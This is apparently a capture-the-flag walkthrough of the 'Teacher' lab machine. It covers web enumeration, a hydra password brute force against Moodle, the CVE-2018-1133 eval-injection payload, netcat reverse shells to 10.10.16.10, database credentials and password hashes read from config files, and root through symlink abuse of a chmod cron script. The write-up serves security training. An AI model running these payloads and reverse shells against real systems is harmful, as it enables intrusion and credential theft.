1,Recon
Port scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Blackhat highschool
|_http-server-header: Apache/2.4.25 (Debian)
```

Enumerating valid uri
```
/images               (Status: 301) [Size: 313] [--> http://10.10.10.153/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.153/css/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.153/manual/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.153/js/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.153/javascript/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.153/fonts/]
/phpmyadmin           (Status: 403) [Size: 277]
/moodle               (Status: 301) [Size: 313] [--> http://10.10.10.153/moodle/]
/server-status        (Status: 403) [Size: 277]
```

`/moodle` seems like our target and it would redirect to `http://teacher.htb/moodle/`
![](images/Pasted%20image%2020241104075221.png)

And also we can extra information from `Wappalyzer`
![](images/Pasted%20image%2020241104075448.png)

The version of LMS is `Moodle`

And by enumerating the web service ,we found 
`http://teacher.htb/moodle/lib/ajax/`
![](images/Pasted%20image%2020241104080358.png)

And also, I found something wired from `/images`
![](images/Pasted%20image%2020241104080934.png)
`5.png` seems like a not normal size picture, and when we open it, it would drop the error
![](images/Pasted%20image%2020241104081042.png)
That means we could not check it directly, so let's check it from the source code of original page.
We found it from `view-source:http://teacher.htb/gallery.html`

`<li><a href="[#](view-source:http://teacher.htb/gallery.html#)"><img src="[images/5.png](view-source:http://teacher.htb/images/5.png)" onerror="console.log('That\'s an F');" alt=""></a></li>`

However I find it, 5.png isn’t an image, but a note:
```
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```

From the note I know all but the last character of the password to log into something.
I’ll use python to generate passwords:
```
python3 -c 'import string; print("\n".join([f"Th4C00lTheacha{c}" for c in string.printable[:-5]]))' > passwords
```

Now I’ll use hydra to try them and find the password:
```
hydra -l Giovanni -P passwords 10.10.10.153 http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^&rememberusername=1:Invalid login"                 
```

Or we can use `burpsuite Intruder` to check them.
![](images/Pasted%20image%2020241104082012.png)
And we get the password `Giovanni:Th4C00lTheacha#`

By searching the exploits of `Moodle, we found `Moodle 3.4.1 - Remote Code Execution from exploit-db

```
CVE-2018-1133 was a vulnerability that allows any user in the teacher role to get remote code execution through Moodle. The vulnerability is in the part of the code that allows a teacher to define a problem like “What is {x} + {y}?”, and have different x and y for each student. Moodle picks a random x and y, and then gets the answer by calling php’s eval() on the formula input. So if I can poison the input, I can get it to run my code. The post gives the following string that will give execution and bypass filters:

/*{a*/`$_GET[0]`;//{x}}

```

That means we can use this payload in the quiz creating page

Firstly we can add a quiz:
![](images/Pasted%20image%2020241121050814.png)

![](images/Pasted%20image%2020241121050914.png)
A new calculated type question is added in order to inject arbitrary PHP code in the answer of the question, in order to perform a Remote Code Execution.

In the following example, the payload `/*{a*/`$_GET[0]`;//{x}}` is added.
![](images/Pasted%20image%2020241121050951.png)

I’ll use this RCE to get a shell, grabbing my go to from the reverse shell cheat sheet, adding `0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.10 443 >/tmp/f` to the end of the url. I did have to encode the & so that it wasn’t treated as another parameter. 
```
http://10.10.10.153/moodle/question/question.php?returnurl=/mod/quiz/edit.php?cmid=7&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 443 >/tmp/f
```
Remember open the netcat to handle the revershell.

2,switch to the valid user
when we successfully get the shell, we would be in `/var/www/html/moodle/question`
And we can find the database certificate in the `config.php`
```
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);

$CFG->wwwroot   = 'http://teacher.htb/moodle';
$CFG->dataroot  = '/var/www/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!

```

Then we can get some hashes of password for the valid users:
```
guest:$2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO
admin:$2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2
giovanni:$2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO
Giovannibak | 7a860966115182402ed06375cf0a22af
```
Then we can get the valid certificate `Giovannibak:expelled`

When we check the `/etc/passwd`, we found the user `giovanni`
`giovanni:x:1000:1000:Giovanni,1337,,:/home/giovanni:/bin/bash`

3, shell as root
we can use `su` to switch to this valid user.
Then I found there is no command `sudo`, so we could not found what can we do as root
So pspy would be a great way to check what is going on in the background
![](images/Pasted%20image%2020241121044657.png)
There is a `backup.sh` always run in the background by root.
```
giovanni@teacher:~$ ls -al /usr/bin/backup.sh
-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh

giovanni@teacher:~$ cat /usr/bin/backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

We can only read this script, and I think `chmod` would be our target because it has use 777.

In this place, I’m going to take advantage of the fact that I can write symlinks pointing to directories / files I don’t own. From man chmod:
```
chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered during recursive directory traversals
chmod 永远不会更改符号链接的权限； chmod 系统调用无法更改其权限。这不是问题，因为符号链接的权限从未被使用过。但是，对于命令行上列出的每个符号链接，chmod 都会更改指向文件的权限。相反，chmod 会忽略递归目录遍历期间遇到的符号链接
```
it will only follow symlinks that are directly referenced by the command line (after wildcard expansion).

So if I create a symbolic link in ~/work/tmp, the thing it points to will have it’s permissions changed.
`ln -s /usr/bin/backup.sh `
After a minute, we would find
`-rwxrwxrwx 1 root root 138 Jun 27  2018 /usr/bin/backup.sh`

Then we can add a reverse shell to get the root shell.
`echo "nc -e /bin/bash 10.10.16.10 443" >> /usr/bin/backup.sh`

Or, if I wanted to be blunt, I could just point it at /, and let chmod recursively give me (and everyone else) access to the entire filesystem.
`ln -s /root`
Then wait for a minute, we got:
`drwxrwxrwx  3 root root  4096 Nov 21 08:56 root`